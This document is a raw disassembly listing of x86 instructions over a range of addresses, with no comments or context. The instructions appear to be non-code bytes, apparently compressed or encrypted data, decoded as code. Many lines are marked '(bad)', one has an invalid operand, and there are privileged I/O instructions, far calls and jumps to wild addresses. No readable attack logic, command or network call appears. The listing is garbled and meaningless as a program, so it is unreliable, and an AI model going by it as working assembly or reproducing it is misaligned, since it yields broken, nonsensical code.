  4153dd:	xchg   esi,eax
  4153de:	mov    esp,0xe8cc80ae
  4153e3:	popf   
  4153e4:	bound  ebx,QWORD PTR [ecx+0x3f0afb2e]
  4153ea:	or     DWORD PTR [edi+eax*8-0x67],0xdb0e3772
  4153f2:	jbe    0x415461
  4153f4:	sub    ebp,DWORD PTR [edi+0x3e0147d8]
  4153fa:	and    al,0x2e
  4153fc:	rcr    DWORD PTR [ebp-0x12],1
  4153ff:	and    al,0x45
  415401:	xor    eax,0x69497d9a
  415406:	mov    eax,0x3fbf6569
  41540b:	sbb    bh,BYTE PTR [ecx+esi*1]
  41540e:	mov    BYTE PTR [edx],dh
  415410:	sbb    ecx,DWORD PTR [ecx]
  415412:	mov    al,0xbc
  415414:	inc    ecx
  415415:	cmp    eax,0xf7e17fc2
  41541a:	mov    al,0x44
  41541c:	ins    BYTE PTR es:[edi],dx
  41541d:	mov    eax,ds:0x22b0889e
  415422:	pushf  
  415423:	cwde   
  415424:	jns    0x415487
  415426:	jmp    0x415498
  415428:	mov    BYTE PTR [ebx+0x7d47b6a9],0xe1
  41542f:	enter  0x432e,0x92
  415433:	add    edi,DWORD PTR [ecx-0x6d56bfab]
  415439:	stc    
  41543a:	loopne 0x41548e
  41543c:	aad    0xa4
  41543e:	xchg   edi,eax
  41543f:	mov    ds:0xced968c2,al
  415444:	call   0x1a31:0x39d8077d
  41544b:	mov    esp,0xb24a9457
  415450:	xchg   edi,eax
  415451:	stos   DWORD PTR es:[edi],eax
  415452:	cmp    al,0xf0
  415454:	lock adc DWORD PTR [ebx+0x4e],0x1e
  415459:	fucomi st,st(4)
  41545b:	loope  0x415470
  41545d:	scas   al,BYTE PTR es:[edi]
  41545e:	mov    ebp,0xceff332a
  415463:	cmp    bl,0x31
  415466:	xchg   esp,eax
  415467:	(bad)  
  415469:	dec    ecx
  41546a:	pusha  
  41546b:	mov    ebp,0xdbaa2989
  415470:	or     al,0x95
  415472:	add    BYTE PTR [edx+0x60eaba9c],bh
  415478:	pop    esi
  415479:	jns    0x41546d
  41547b:	dec    ebx
  41547c:	mov    esi,0x5d6b9a7d
  415481:	repnz aam 0x1c
  415484:	fistp  WORD PTR [ebp-0x11]
  415487:	inc    eax
  415488:	push   cs
  415489:	rol    DWORD PTR [ebx],0x94
  41548c:	mov    edi,0xbb78a70a
  415491:	xchg   ebp,eax
  415492:	push   ebp
  415493:	and    DWORD PTR [eax-0x7d39c5e1],ebp
  415499:	mov    ebp,0x871d50e2
  41549e:	jmp    0x415511
  4154a0:	shr    ebx,cl
  4154a2:	sar    DWORD PTR [edx],1
  4154a4:	pop    ecx
  4154a5:	sbb    al,0x4a
  4154a7:	cmp    eax,0x33db1b4b
  4154ac:	rcr    BYTE PTR [eax],0x6f
  4154af:	sbb    edi,ecx
  4154b1:	iret   
  4154b2:	out    dx,al
  4154b3:	out    0x5,al
  4154b5:	imul   edi,DWORD PTR [edi+0x44eab3f0],0x7a
  4154bc:	(bad)  
  4154bd:	in     eax,0x33
  4154bf:	adc    BYTE PTR [edi],0x39
  4154c2:	fiadd  DWORD PTR [ebp+0x31]
  4154c5:	(bad)  [ebp-0x4dbfc987]
  4154cb:	rol    BYTE PTR [ecx+0x289c3bc4],0x64
  4154d2:	push   0x37a1650f
  4154d7:	xor    al,0x85
  4154d9:	icebp  
  4154da:	fidivr WORD PTR [edi]
  4154dc:	push   eax
  4154dd:	inc    edi
  4154de:	mov    al,ds:0x83ef0eb9
  4154e3:	jae    0x415494
  4154e5:	inc    edi
  4154e6:	and    eax,0x144a8d54
  4154eb:	add    DWORD PTR ds:0x1091850e,ebx
  4154f1:	imul   DWORD PTR [edi+0x3524a181]
  4154f7:	and    al,0xad
  4154f9:	jl     0x41549a
  4154fb:	mov    bh,0x2a
  4154fd:	xchg   ebp,eax
  4154fe:	je     0x415527
  415500:	outs   dx,BYTE PTR ds:[esi]
  415501:	test   DWORD PTR [ecx-0x7e1c9bf6],ecx
  415507:	cmp    BYTE PTR [ecx],dl
  415509:	cmp    eax,0xcd5bae46
  41550e:	leave  
  41550f:	out    dx,eax
  415510:	leave  
  415511:	inc    ebp
  415512:	popf   
  415513:	push   ebx
  415514:	pushw  0x545d
  415518:	lock test eax,0x3475cdd6
  41551e:	pop    ebp
  41551f:	pop    ebx
  415520:	fcomp  QWORD PTR [eax+0x73d1b7f8]
  415526:	cmp    DWORD PTR [esi],ebx
  415528:	mov    dl,0xa
  41552a:	sahf   
  41552b:	xlat   BYTE PTR ds:[ebx]
  41552c:	add    BYTE PTR ds:0x4cceffa5,dh
  415532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415533:	cmp    DWORD PTR [ebp+0x4c05d2e3],edx
  415539:	daa    
  41553a:	mov    ?,WORD PTR [eax+0x1e]
  41553d:	jae    0x415539
  41553f:	test   eax,0xdd70dba8
  415544:	(bad)  
  415545:	sub    eax,0x87debc67
  41554a:	mov    esp,0xaa502817
  41554f:	ret    0x8f66
  415552:	pop    ebx
  415553:	push   ebx
  415554:	add    BYTE PTR [esi-0x2db063a1],0xb9
  41555b:	mov    esp,0x6625f2
  415560:	sbb    BYTE PTR [ebx+0x4],0x57
  415564:	cmp    eax,0x2519effa
  415569:	sbb    bh,BYTE PTR [edx+0x3f7bd7d5]
  41556f:	shl    BYTE PTR [eax+edi*2-0x56],1
  415573:	mov    BYTE PTR [edi+0x2a],dh
  415576:	call   0x5b8e1840
  41557b:	mov    edx,0x7638b8c9
  415580:	das    
  415581:	jecxz  0x415507
  415583:	ins    BYTE PTR es:[edi],dx
  415584:	rsqrtps xmm6,XMMWORD PTR [ebx-0x215e9347]
  41558b:	ja     0x41558f
  41558d:	cmp    al,0xc3
  41558f:	xor    esi,0xffffffd5
  415592:	mov    dh,0xf9
  415594:	adc    ecx,DWORD PTR [ebx]
  415596:	in     eax,dx
  415597:	push   ss
  415598:	loopne 0x41553a
  41559a:	push   es
  41559b:	js     0x41554a
  41559d:	std    
  41559e:	test   BYTE PTR [eax+0x1ec80bc4],ch
  4155a4:	outs   dx,BYTE PTR ds:[esi]
  4155a5:	jb     0x415540
  4155a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155a8:	xchg   esp,eax
  4155a9:	push   esi
  4155aa:	xor    eax,0xd09895de
  4155af:	or     edx,DWORD PTR [edx+0x79491073]
  4155b5:	lea    ebp,[edx]
  4155b7:	mov    eax,0x91363bca
  4155bc:	fist   WORD PTR [ebp+0x55]
  4155bf:	inc    ebp
  4155c0:	and    al,bh
  4155c2:	mov    ah,0xc5
  4155c4:	sbb    al,0x44
  4155c6:	xchg   DWORD PTR [edi+0x1c],edi
  4155c9:	outs   dx,DWORD PTR ds:[esi]
  4155ca:	mov    dl,0xb3
  4155cc:	addr16 mov edi,0x29ab946b
  4155d2:	cdq    
  4155d3:	mov    BYTE PTR [edx+0x65ab6a11],al
  4155d9:	push   eax
  4155da:	gs jmp 0x4155fc
  4155dd:	sbb    BYTE PTR [eax],dh
  4155df:	shl    BYTE PTR [ecx+0xb],1
  4155e2:	popa   
  4155e3:	xchg   BYTE PTR [edx+edx*8+0x34],bl
  4155e7:	jp     0x415653
  4155e9:	scas   al,BYTE PTR es:[edi]
  4155ea:	and    al,0xb8
  4155ec:	fs repz std 
  4155ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155f0:	(bad)  
  4155f1:	push   esi
  4155f2:	xlat   BYTE PTR ds:[ebx]
  4155f3:	or     al,0xb9
  4155f5:	or     eax,DWORD PTR [eax-0x6960de30]
  4155fb:	cmc    
  4155fc:	fcomp  QWORD PTR [esp+ecx*2]
  4155ff:	cdq    
  415600:	mov    eax,ds:0xb4ecd8e3
  415605:	jns    0x415676
  415607:	lods   eax,DWORD PTR ds:[esi]
  415608:	fmul   QWORD PTR [edx-0x445a32e2]
  41560e:	xor    DWORD PTR [ebp-0x17],esp
  415611:	mov    dh,0x60
  415613:	xor    ch,BYTE PTR ds:0x469498f5
  415619:	lods   al,BYTE PTR ds:[esi]
  41561a:	aad    0xae
  41561c:	sub    DWORD PTR [ebx-0x4deb4114],edi
  415622:	pop    edx
  415623:	addr16 es fs dec edi
  415627:	mov    dh,0x2a
  415629:	add    esi,DWORD PTR [ecx+0x2]
  41562c:	les    ebp,FWORD PTR [ebx+0x55]
  41562f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415630:	mov    BYTE PTR ds:[ecx-0x3c7e4d85],dh
  415637:	and    al,BYTE PTR [edx-0x15]
  41563a:	pop    ds
  41563b:	jnp    0x415642
  41563d:	xor    esp,0xd0f7b484
  415643:	daa    
  415644:	sbb    BYTE PTR [ecx],ch
  415646:	inc    esi
  415647:	fild   DWORD PTR [esi]
  415649:	jo     0x415636
  41564b:	or     eax,0xd6a4f126
  415650:	cmp    eax,0x73874747
  415655:	mov    dl,0xbf
  415657:	xchg   ebp,eax
  415658:	and    ecx,ebx
  41565a:	add    BYTE PTR ds:0xb1da18e3,0xfb
  415661:	push   esi
  415662:	mov    dl,BYTE PTR [esi]
  415664:	dec    esi
  415665:	jns    0x4155f9
  415667:	scas   al,BYTE PTR es:[edi]
  415668:	shr    BYTE PTR [ebx],cl
  41566a:	(bad)  
  41566d:	je     0x415624
  41566f:	jns    0x41560f
  415671:	cmp    eax,0x4dce13de
  415676:	add    BYTE PTR [esi+0x14c324b0],dh
  41567c:	shl    DWORD PTR [edx-0x22edbc16],0xf4
  415683:	mov    ds:0xef397d88,al
  415688:	cmp    BYTE PTR [edi+0x2970873a],ch
  41568e:	mov    cl,0xb5
  415690:	inc    esp
  415691:	dec    eax
  415692:	or     eax,0x27018b6
  415697:	es pop esp
  415699:	fmul   DWORD PTR [ecx+0x62]
  41569c:	ret    
  41569d:	mov    ds:0x35529c26,eax
  4156a2:	or     eax,0x3664aef2
  4156a7:	and    ch,BYTE PTR [eax-0x58]
  4156aa:	aaa    
  4156ab:	push   0x37fea65c
  4156b0:	inc    ecx
  4156b1:	scas   al,BYTE PTR es:[edi]
  4156b2:	(bad)  
  4156b3:	mov    edi,0xbed9ed89
  4156b8:	aam    0x42
  4156ba:	xor    eax,0x5e8baf8a
  4156bf:	pop    esp
  4156c0:	add    ah,ch
  4156c2:	jg     0x41564f
  4156c4:	popa   
  4156c5:	dec    edi
  4156c6:	das    
  4156c7:	cmp    bh,BYTE PTR [ebp-0x4d]
  4156ca:	sbb    edx,DWORD PTR [eax+0x13]
  4156cd:	scas   al,BYTE PTR es:[edi]
  4156ce:	out    dx,al
  4156cf:	in     eax,0xd7
  4156d1:	pop    es
  4156d2:	rcr    BYTE PTR [edx+0x51],1
  4156d5:	cld    
  4156d6:	les    edx,FWORD PTR [esi-0x51d0a1a6]
  4156dc:	iret   
  4156dd:	adc    ecx,DWORD PTR [ecx+0x5668be1c]
  4156e3:	mov    BYTE PTR [ecx],dh
  4156e5:	inc    esi
  4156e6:	and    BYTE PTR [eax-0x2f],al
  4156e9:	jmp    0x4064f318
  4156ee:	mov    bl,0xba
  4156f0:	xor    DWORD PTR [ecx+0x16],0x87a6b38c
  4156f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156f8:	in     al,0x60
  4156fa:	fldl2e 
  4156fc:	pop    eax
  4156fd:	stos   BYTE PTR es:[edi],al
  4156fe:	outs   dx,BYTE PTR ds:[esi]
  4156ff:	and    BYTE PTR [ecx+0x36a5e2e1],bh
  415705:	jbe    0x41576b
  415707:	jp     0x415702
  415709:	scas   al,BYTE PTR es:[edi]
  41570a:	popa   
  41570b:	and    DWORD PTR [ebx],esp
  41570d:	xchg   edi,eax
  41570e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41570f:	dec    ecx
  415710:	jo     0x4156bc
  415712:	xor    esi,DWORD PTR [eax]
  415714:	lods   al,BYTE PTR ds:[esi]
  415715:	pop    ds
  415716:	iret   
  415717:	test   eax,0x6aabb5ff
  41571c:	mov    ebx,0x8af96920
  415721:	hlt    
  415722:	dec    esp
  415723:	scas   eax,DWORD PTR es:[edi]
  415724:	sbb    ebp,DWORD PTR ds:[esi]
  415727:	mov    ebp,0x9887fca
  41572c:	mov    bh,BYTE PTR ds:0xe72d4dca
  415732:	xor    BYTE PTR [ecx+0x67],0x1f
  415736:	fnstcw WORD PTR [edi]
  415738:	fsubr  QWORD PTR [ebx]
  41573a:	in     eax,dx
  41573b:	push   edi
  41573c:	icebp  
  41573d:	(bad)  
  41573e:	loope  0x415702
  415740:	fdiv   st,st(7)
  415743:	iret   
  415744:	xchg   ebp,eax
  415745:	adc    DWORD PTR [ecx],ecx
  415747:	pop    esi
  415748:	xor    al,0xdb
  41574a:	iret   
  41574b:	outs   dx,BYTE PTR ds:[esi]
  41574c:	lds    edi,FWORD PTR [esi+0x3135abaf]
  415752:	ret    0x4d94
  415755:	dec    eax
  415756:	outs   dx,BYTE PTR ds:[esi]
  415757:	das    
  415758:	or     ch,bl
  41575a:	fnsetpm(287 only) 
  41575c:	loope  0x415770
  41575e:	sub    al,0xb4
  415760:	push   es
  415761:	mov    bl,0xad
  415763:	jg     0x41578e
  415765:	dec    eax
  415766:	arpl   WORD PTR [ecx],si
  415768:	sahf   
  415769:	popf   
  41576a:	pop    esi
  41576b:	inc    ebp
  41576c:	jb     0x415768
  41576e:	push   ebp
  41576f:	add    DWORD PTR ds:0xf1e7cb02,ecx
  415775:	out    dx,al
  415776:	add    eax,0x6c81a768
  41577b:	imul   BYTE PTR [eax+eiz*4-0x48]
  41577f:	xlat   BYTE PTR ds:[ebx]
  415780:	fs pop esi
  415782:	pushf  
  415783:	rcr    ecx,cl
  415785:	nop
  415786:	data16 stos BYTE PTR es:[edi],al
  415788:	push   ss
  415789:	stc    
  41578a:	xchg   ebx,eax
  41578b:	jecxz  0x4157c5
  41578d:	(bad)  
  41578f:	aas    
  415790:	fild   WORD PTR [ebx+0x41a61327]
  415796:	mov    edi,0xf3db8001
  41579b:	lahf   
  41579c:	sbb    DWORD PTR [ebx],eax
  41579e:	test   BYTE PTR [eax+0x217806ed],al
  4157a4:	push   edx
  4157a5:	or     esi,DWORD PTR [ebx-0x27]
  4157a8:	mov    ds:0x9d7664cf,eax
  4157ad:	(bad)
  4157b0:	sbb    ah,ch
  4157b2:	cmp    BYTE PTR [edi-0x36],bh
  4157b5:	xchg   DWORD PTR [ecx+0xeb4934d],ecx
  4157bb:	jp     0x4157f1
  4157bd:	loope  0x41575b
  4157bf:	and    cl,BYTE PTR [esi+ebx*4+0x56587db1]
  4157c6:	xor    eax,0xa92a329a
  4157cb:	outs   dx,DWORD PTR ds:[esi]
  4157cc:	inc    edi
  4157cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157ce:	sbb    al,0x66
  4157d0:	mov    ds:0xd48139c7,al
  4157d5:	loope  0x415789
  4157d7:	rcl    DWORD PTR ds:0x2764b3b4,0x2b
  4157de:	add    eax,0x54b4f0c5
  4157e3:	shl    BYTE PTR [ecx+edx*4+0x40],1
  4157e7:	jle    0x415815
  4157e9:	inc    ebp
  4157ea:	and    DWORD PTR [esi],0x54b31e8a
  4157f0:	dec    esi
  4157f1:	sub    ecx,DWORD PTR [edi+edx*2+0x62655fd1]
  4157f8:	mov    eax,ds:0x5754f53a
  4157fd:	sar    esi,0x8c
  415800:	inc    eax
  415801:	mov    edi,DWORD PTR [esi+0xe]
  415804:	sub    eax,0x49ebd76b
  415809:	add    esi,eax
  41580b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41580c:	pop    esi
  41580d:	xchg   DWORD PTR [edx-0x30],ebp
  415810:	(bad)  
  415812:	leave  
  415813:	sub    cl,BYTE PTR [ebp+0x58dd8fde]
  415819:	mov    ds:0x451370f1,al
  41581e:	dec    eax
  41581f:	mov    dl,0xbb
  415821:	fsub   DWORD PTR [esi]
  415823:	mov    cl,0xfa
  415825:	iret   
  415826:	neg    ah
  415828:	adc    BYTE PTR [eax-0x6c27122e],bl
  41582e:	cld    
  41582f:	or     esp,DWORD PTR [edi+0x55]
  415832:	hlt    
  415833:	xor    edx,eax
  415835:	cli    
  415836:	dec    ebx
  415837:	loope  0x41589b
  415839:	push   ss
  41583a:	push   ebx
  41583b:	loop   0x4158a0
  41583d:	push   0x67
  41583f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415840:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  415842:	call   0x7d6411dd
  415847:	data16 fistp DWORD PTR [edi+0x1e]
  41584b:	arpl   WORD PTR [ebx+0x3822d902],dx
  415851:	or     BYTE PTR [ebx+esi*4-0x1d06d2dd],dl
  415858:	test   edx,ebx
  41585a:	iret   
  41585b:	fisubr DWORD PTR [ebx-0x1392e0c5]
  415861:	xor    al,0xca
  415863:	mov    dh,0xd1
  415865:	icebp  
  415866:	mov    edi,0x72a0778a
  41586b:	add    eax,0x931c86b
  415870:	pop    ebp
  415871:	sar    BYTE PTR [edx+0x375620a6],cl
  415877:	gs xchg ebx,eax
  415879:	in     eax,0x65
  41587b:	div    eax
  41587d:	sbb    DWORD PTR [ebx-0x3],ebx
  415880:	and    BYTE PTR [ecx-0x7b593550],dh
  415886:	mov    ah,0x9d
  415888:	xor    eax,0xd0a723f6
  41588d:	mov    edx,0xc110fa15
  415892:	add    al,0x7a
  415894:	push   ss
  415895:	push   cs
  415896:	and    eax,0xc9294e93
  41589b:	inc    edx
  41589c:	adc    DWORD PTR [edi-0x5c],edx
  41589f:	int3   
  4158a0:	and    al,BYTE PTR [edx-0x20]
  4158a3:	xchg   edi,eax
  4158a4:	div    DWORD PTR ds:0xa6a17a
  4158aa:	popf   
  4158ab:	mov    ch,0xf5
  4158ad:	mov    eax,ds:0x93e6fffa
  4158b2:	mov    esp,0x366e464e
  4158b7:	sar    DWORD PTR [ebx],1
  4158b9:	sub    eax,0x8e1632be
  4158be:	or     esi,DWORD PTR [edi+0x25]
  4158c1:	jo     0x415911
  4158c3:	pop    eax
  4158c4:	adc    eax,0x74efae93
  4158c9:	sub    DWORD PTR [esi-0x1f],ebp
  4158cc:	dec    esi
  4158cd:	stos   BYTE PTR es:[edi],al
  4158ce:	mov    bl,0x62
  4158d0:	aaa    
  4158d1:	mov    BYTE PTR [edx],dh
  4158d3:	jge    0x415938
  4158d5:	ret    0x2a5e
  4158d8:	push   0xfffffffb
  4158da:	aad    0x7d
  4158dc:	test   eax,0x3c1fe1b3
  4158e1:	mov    gs,WORD PTR [edi]
  4158e3:	xchg   esi,eax
  4158e4:	aaa    
  4158e5:	bound  ebx,QWORD PTR [ebx]
  4158e7:	push   edi
  4158e8:	jp     0x41591c
  4158ea:	jmp    DWORD PTR [edx+edi*1]
  4158ed:	not    BYTE PTR [esi]
  4158ef:	pushf  
  4158f0:	jno    0x4158b7
  4158f2:	mov    esi,0x26a90b75
  4158f7:	mov    ch,0xe8
  4158f9:	sbb    DWORD PTR [ecx-0x10b6e52b],ebx
  4158ff:	(bad)  
  415900:	call   0xcd8b64f3
  415905:	arpl   WORD PTR [ebx+edx*2],sp
  415908:	mov    edi,0xf98c4e44
  41590d:	imul   ecx,DWORD PTR [esi],0xc0040678
  415913:	sbb    eax,DWORD PTR [edi+0x7a]
  415916:	sub    edi,DWORD PTR [edi+0x6257017c]
  41591c:	mov    dh,0x95
  41591e:	mov    BYTE PTR [esi+edi*4-0x80],cl
  415922:	dec    edx
  415923:	pop    edi
  415924:	or     esp,eax
  415926:	inc    edx
  415927:	not    DWORD PTR [esi+0x75aa2f8a]
  41592d:	mov    dl,0x79
  41592f:	or     ecx,DWORD PTR [eax-0x4]
  415932:	mov    edi,0x73cf3d99
  415937:	push   esp
  415938:	clc    
  415939:	enter  0xf0a8,0xc9
  41593d:	xor    esi,ecx
  41593f:	fistp  DWORD PTR [edi+0x4d69ee78]
  415945:	mov    al,ds:0xf8d55780
  41594a:	xchg   edx,eax
  41594b:	rcr    edi,0x5a
  41594e:	jne    0x4159b6
  415950:	or     ch,BYTE PTR [ecx-0x1ded4a4d]
  415956:	xchg   ebx,eax
  415957:	cdq    
  415958:	das    
  415959:	push   esi
  41595a:	in     al,dx
  41595b:	dec    ecx
  41595c:	test   DWORD PTR [ecx+0x11],0x37494037
  415963:	(bad)  
  415965:	out    dx,al
  415966:	mov    ebx,0x925ef324
  41596b:	jmp    0x7aee207e
  415970:	test   BYTE PTR [esi],0x24
  415973:	cmp    al,BYTE PTR es:[edx-0x40]
  415977:	ret    
  415978:	fsubr  QWORD PTR [ecx]
  41597a:	jl     0x4159a4
  41597c:	mov    ds,WORD PTR [ebx-0x23]
  41597f:	jae    0x41590e
  415981:	inc    ecx
  415982:	sbb    BYTE PTR [esi],ah
  415984:	repz add al,0x73
  415987:	loopne 0x41590b
  415989:	push   ebx
  41598a:	ja     0x415982
  41598c:	jnp    0x4159c7
  41598e:	pop    eax
  41598f:	xor    DWORD PTR [ecx-0x61adf593],ebx
  415995:	push   ss
  415996:	rcr    esi,0x25
  415999:	adc    dl,BYTE PTR [ebx+0x77921607]
  41599f:	loopne 0x4159b9
  4159a1:	sub    edx,esp
  4159a3:	sub    edx,DWORD PTR [ebx+0x7e]
  4159a6:	push   eax
  4159a7:	repz mov eax,0xce033d34
  4159ad:	lock cwde 
  4159af:	scas   eax,DWORD PTR es:[edi]
  4159b0:	mov    BYTE PTR [eax-0x3d],ah
  4159b3:	loope  0x4159e2
  4159b5:	mov    edi,0x907fd2ef
  4159ba:	into   
  4159bb:	jnp    0x4159a3
  4159bd:	gs pushf 
  4159bf:	push   es
  4159c0:	ret    0x2e2f
  4159c3:	and    BYTE PTR [edi],ah
  4159c5:	push   es
  4159c6:	icebp  
  4159c7:	jmp    0x4159d9
  4159c9:	cmp    edx,DWORD PTR [ecx]
  4159cb:	cli    
  4159cc:	ror    cl,cl
  4159ce:	mov    bl,BYTE PTR [ebp+esi*8-0x4ea6e603]
  4159d5:	loope  0x415a46
  4159d7:	mov    ecx,0x33719502
  4159dc:	test   al,0xeb
  4159de:	xchg   esi,eax
  4159e0:	fmul   QWORD PTR [ebp-0x3f6842b7]
  4159e6:	and    esp,ebp
  4159e8:	fimul  WORD PTR [ecx]
  4159ea:	jb     0x415984
  4159ec:	pop    ebp
  4159ed:	mov    esi,0x12c1c68c
  4159f2:	adc    al,0x3d
  4159f4:	dec    edx
  4159f5:	xchg   esi,eax
  4159f6:	(bad)  
  4159f7:	dec    edi
  4159f8:	shl    BYTE PTR [eax-0x3e],1
  4159fb:	cwde   
  4159fc:	lahf   
  4159fd:	(bad)  
  4159fe:	mov    dl,0x93
  415a00:	inc    ecx
  415a01:	pop    ss
  415a02:	nop    DWORD PTR ds:0x57a7f2e0
  415a09:	in     al,0x7d
  415a0b:	pop    ds
  415a0c:	jmp    0xb2e08e9c
  415a11:	jmp    0xcce9:0xbaa4e6e7
  415a18:	test   DWORD PTR [ecx],ebx
  415a1a:	and    edx,ebp
  415a1c:	(bad)  
  415a1d:	rcl    DWORD PTR [ecx],cl
  415a1f:	xchg   edx,eax
  415a20:	add    BYTE PTR [eax],bl
  415a22:	dec    edx
  415a23:	cwde   
  415a24:	xlat   BYTE PTR ds:[ebx]
  415a25:	sub    BYTE PTR [esi],0xd
  415a28:	aaa    
  415a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a2a:	sbb    eax,0xedee0291
  415a2f:	pushf  
  415a30:	cmp    eax,0x17c5e5e4
  415a35:	mov    ah,0x63
  415a37:	xchg   edx,eax
  415a38:	std    
  415a39:	pop    ds
  415a3a:	jnp    0x415a25
  415a3c:	scas   al,BYTE PTR es:[edi]
  415a3d:	pop    esp
  415a3e:	(bad)  
  415a3f:	(bad)
  415a42:	jg     0x415a2b
  415a44:	mov    edi,0x39483d0a
  415a49:	mov    esi,gs
  415a4b:	into   
  415a4c:	leave  
  415a4d:	pop    esi
  415a4e:	ret    
  415a4f:	xchg   edx,ebp
  415a51:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  415a53:	cmp    BYTE PTR [edi],ah
  415a55:	or     cl,BYTE PTR [eax]
  415a57:	cmp    cl,BYTE PTR [esp+ecx*4+0x4a25f6f2]
  415a5e:	sbb    ch,BYTE PTR [esp+edi*4+0x2e29bdcf]
  415a65:	scas   al,BYTE PTR es:[edi]
  415a66:	sahf   
  415a67:	das    
  415a68:	add    al,0xb3
  415a6a:	mov    bh,0x9b
  415a6c:	popf   
  415a6d:	and    al,0xf1
  415a6f:	mov    gs,ecx
  415a71:	pop    esi
  415a72:	iret   
  415a73:	pop    ss
  415a74:	fistp  DWORD PTR [ebp-0x6a9e8be3]
  415a7a:	sti    
  415a7b:	add    bl,ch
  415a7d:	add    al,0x1
  415a7f:	sti    
  415a80:	mov    ebx,0xb36ad361
  415a85:	out    dx,al
  415a86:	mov    DWORD PTR ds:0x9a36fa5d,ecx
  415a8c:	and    DWORD PTR [esi],edi
  415a8e:	(bad)  
  415a8f:	sbb    esi,esp
  415a91:	push   ecx
  415a92:	cmp    cl,cl
  415a94:	xor    DWORD PTR [edi],esi
  415a96:	mov    ah,0x7a
  415a98:	loopne 0x415aa0
  415a9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a9b:	and    DWORD PTR [ebx],edx
  415a9d:	pop    esi
  415a9e:	add    eax,0xb5e6c9b3
  415aa3:	jnp    0x415a51
  415aa5:	pop    esp
  415aa6:	dec    eax
  415aa7:	inc    esp
  415aa8:	ins    DWORD PTR es:[edi],dx
  415aa9:	mov    ss,edx
  415aab:	push   es
  415aac:	and    eax,0x64d9eb99
  415ab1:	loope  0x415af9
  415ab3:	ret    0x251a
  415ab6:	mov    ah,0x61
  415ab8:	ret    0xa070
  415abb:	inc    edx
  415abc:	mov    ecx,0x53fbc239
  415ac1:	dec    esi
  415ac2:	icebp  
  415ac3:	iret   
  415ac4:	clc    
  415ac5:	outs   dx,DWORD PTR ds:[esi]
  415ac6:	fwait
  415ac7:	mov    ds:0x6558e7bf,al
  415acc:	ins    DWORD PTR es:[edi],dx
  415acd:	push   ebp
  415ace:	stc    
  415acf:	xor    esp,DWORD PTR [ebx-0x2b53fbc6]
  415ad5:	in     eax,dx
  415ad6:	cli    
  415ad7:	sbb    DWORD PTR [edx],edx
  415ad9:	or     ah,ch
  415adb:	enter  0xec06,0x3d
  415adf:	jnp    0x415a8b
  415ae1:	fwait
  415ae2:	stos   DWORD PTR es:[edi],eax
  415ae3:	mov    ds:0x5c35eddf,al
  415ae8:	outs   dx,DWORD PTR ds:[esi]
  415ae9:	jno    0x415ab5
  415aeb:	jo     0x415aaf
  415aed:	rol    BYTE PTR [edx+0x33],0x4
  415af1:	mov    edx,gs
  415af3:	cmc    
  415af4:	pop    edi
  415af5:	push   edx
  415af6:	adc    esi,DWORD PTR [esi]
  415af8:	push   0x31
  415afa:	call   0x4ab61f49
  415aff:	jg     0x415b49
  415b01:	jl     0x415b6a
  415b03:	clc    
  415b04:	aas    
  415b05:	test   al,0x76
  415b07:	push   esp
  415b08:	push   ss
  415b09:	into   
  415b0a:	aad    0x11
  415b0c:	daa    
  415b0d:	inc    ebp
  415b0e:	aam    0x7d
  415b10:	aad    0xc5
  415b12:	cwde   
  415b13:	push   0x70
  415b15:	lahf   
  415b16:	pop    edx
  415b17:	push   ss
  415b18:	lods   al,BYTE PTR ds:[esi]
  415b19:	push   ebx
  415b1a:	sbb    eax,DWORD PTR [edx-0x68]
  415b1d:	and    edx,DWORD PTR [esi+ebx*2+0x39]
  415b21:	push   cs
  415b22:	push   ecx
  415b23:	pop    ss
  415b24:	add    ah,BYTE PTR [edx-0x2d]
  415b27:	push   ebx
  415b28:	ins    BYTE PTR es:[edi],dx
  415b29:	shl    al,1
  415b2b:	repnz popf 
  415b2d:	mov    ebx,0xa1c98979
  415b32:	out    0xa0,eax
  415b34:	fisttp QWORD PTR [edx]
  415b36:	aas    
  415b37:	(bad)  
  415b38:	cld    
  415b39:	inc    edi
  415b3a:	push   0xdc0abdef
  415b3f:	in     al,0x23
  415b41:	test   al,0x1
  415b43:	or     ebx,esi
  415b45:	add    al,0xb3
  415b47:	les    ebx,FWORD PTR [edx+eiz*4]
  415b4a:	shr    edi,1
  415b4c:	nop
  415b4d:	mov    ch,0x6b
  415b4f:	outs   dx,DWORD PTR ds:[esi]
  415b50:	addr16 fucomi st,st(1)
  415b53:	push   ss
  415b54:	add    bl,cl
  415b56:	pop    esi
  415b57:	in     eax,0x99
  415b59:	mov    bl,0xde
  415b5b:	aad    0xd5
  415b5d:	pop    esi
  415b5e:	mov    ecx,0xbec4851a
  415b63:	pop    ds
  415b64:	pop    esp
  415b65:	and    DWORD PTR [edi-0x70],0x3e
  415b69:	xchg   ebp,eax
  415b6a:	xor    DWORD PTR [edx-0x450cd1ed],esp
  415b70:	les    esp,FWORD PTR [ebp+0x5]
  415b73:	popf   
  415b74:	test   BYTE PTR [edi-0x78],dh
  415b77:	pop    ecx
  415b78:	mov    WORD PTR [edx+edx*2-0x23d1edb],cs
  415b7f:	sbb    bl,ch
  415b81:	mov    ecx,DWORD PTR [ebx+eax*2]
  415b84:	cmp    al,0x2e
  415b86:	adc    al,0x6b
  415b88:	das    
  415b89:	xor    eax,0xa2b6296c
  415b8e:	sbb    BYTE PTR [edx+0x3ca51bcb],0x5b
  415b95:	inc    ebx
  415b96:	mov    al,0x27
  415b98:	rcr    BYTE PTR [ecx],0xa8
  415b9b:	imul   ecx,DWORD PTR [eax+ebx*1-0x6a],0xffffffa4
  415ba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ba1:	xchg   ebx,eax
  415ba2:	es dec esi
  415ba4:	jae    0x415b37
  415ba6:	add    DWORD PTR [edi+0x63],ebx
